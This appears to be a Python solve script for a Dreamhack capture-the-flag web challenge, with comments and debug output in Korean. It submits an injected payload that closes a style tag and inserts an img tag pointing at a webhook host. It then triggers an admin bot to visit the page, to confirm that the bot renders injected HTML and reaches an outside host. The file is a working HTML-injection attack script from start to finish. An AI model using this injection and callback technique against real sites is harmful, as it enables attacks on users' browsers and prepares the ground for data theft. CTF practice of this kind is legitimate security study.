import requests

TARGET_URL = "http://host8.dreamhack.games:20570"
WEBHOOK_URL = "https://ogdsqbg.request.dreamhack.games"

def check_bot_alive():
    print("\n[DEBUG] ====================================================")
    print("[DEBUG] 🚨 관리자 봇 생사 여부 최종 판별 스크립트 🚨")
    print("[DEBUG] ====================================================")

    # 핵심: </style>로 기존 스타일 태그를 탈출하고 HTML img 태그를 강제 삽입합니다.
    # 브라우저의 CSS 렌더링 엔진 상태와 무관하게, HTML 파서는 무조건 img src를 요청합니다.
    payload = f"</style><img src='{WEBHOOK_URL}/?test=HTML_IMG_TAG_ALIVE_CHECK'><style>"
    
    print(f"[DEBUG] [1단계] 주입할 페이로드: {payload}")
    print("[DEBUG] [1단계] CSS 렌더링 엔진을 우회하는 순수 HTML 삽입 기법 적용 완료.")

    # 1. 제출 (Submit)
    print(f"\n[DEBUG] [2단계] {TARGET_URL}/submit 에 페이로드 제출 시도...")
    res_submit = requests.post(f"{TARGET_URL}/submit", data={"css": payload}, allow_redirects=False)
    
    location = res_submit.headers.get("Location", "")
    if "/view/" not in location:
        print(f"[DEBUG] ❌ [에러] 제출 실패. (Location: {location})")
        return
        
    idx = location.split("/")[-1]
    print(f"[DEBUG] ✅ [2단계] 제출 성공! 할당받은 리포트 idx: {idx}")

    # 2. 봇 방문 트리거 (Report)
    print(f"\n[DEBUG] [3단계] 관리자 봇에게 /view/{idx} 방문을 명령합니다...")
    res_report = requests.post(f"{TARGET_URL}/report/{idx}")
    
    if res_report.status_code in [200, 302]:
        print(f"[DEBUG] ✅ [3단계] 봇 방문 트리거 명령이 서버에 정상 접수되었습니다. (상태 코드: {res_report.status_code})")
    else:
        print(f"[DEBUG] ❌ [에러] 봇 방문 트리거 실패. (상태 코드: {res_report.status_code})")

    print("\n[DEBUG] ====================================================")
    print("[DEBUG] 🏁 판별 완료! 지금 바로 드림핵 툴즈를 확인해 보세요.")
    print("[DEBUG] -> 만약 '?test=HTML_IMG_TAG_ALIVE_CHECK' 요청이 왔다면: 봇은 살아있습니다! (이전 실패는 CSS 렌더링 문제)")
    print("[DEBUG] -> 만약 아무것도 오지 않았다면: 봇은 100% 죽어있거나 아웃바운드가 차단된 상태입니다.")
    print("[DEBUG] ====================================================")

if __name__ == "__main__":
    check_bot_alive()